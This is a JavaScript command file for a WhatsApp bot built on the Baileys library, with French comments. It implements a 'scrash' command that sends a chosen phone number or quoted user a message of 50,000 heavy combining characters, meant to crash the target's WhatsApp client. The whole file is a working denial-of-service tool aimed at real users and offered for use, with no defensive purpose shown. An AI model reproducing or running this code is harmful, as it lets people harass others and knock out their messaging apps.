import { generateWAMessageFromContent } from "@whiskeysockets/baileys";

// === Fonction interne pour créer et envoyer le crash ===
async function forcer(client, isTarget) {
  const payload = {
    extendedTextMessage: {
      text: "ྃ".repeat(50000), // ✅ caractères lourds pour forcer le crash
    },
  };

  const msg = generateWAMessageFromContent(isTarget, payload, { userJid: isTarget });

  await client.relayMessage(isTarget, msg.message, {
    messageId: msg.key.id,
  });
}

// === Commande scrash ===
export const name = "scrash";

export async function execute(sock, m, args) {
  try {
    let participant;

    // Si on répond à un message
    if (m.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
      participant = m.message.extendedTextMessage.contextInfo.participant;
    }
    // Si on donne un numéro en argument
    else if (args.length > 0) {
      participant = args[0].replace("@", "") + "@s.whatsapp.net";
    }
    // Sinon erreur
    else {
      await sock.sendMessage(
        m.key.remoteJid,
        { text: "⚠️ Mentionne ou donne le numéro de la cible." },
        { quoted: m }
      );
      return;
    }

    // Message d’attente
    await sock.sendMessage(
      m.key.remoteJid,
      { text: "🚀 Envoi de scrash en cours..." },
      { quoted: m }
    );

    // Envoi du crash
    await forcer(sock, participant);

    // Confirmation
    await sock.sendMessage(
      m.key.remoteJid,
      { text: "✅ Scrash envoyé avec succès." },
      { quoted: m }
    );

  } catch (error) {
    await sock.sendMessage(
      m.key.remoteJid,
      { text: "❌ Erreur scrash : " + error.message },
      { quoted: m }
    );
  }
}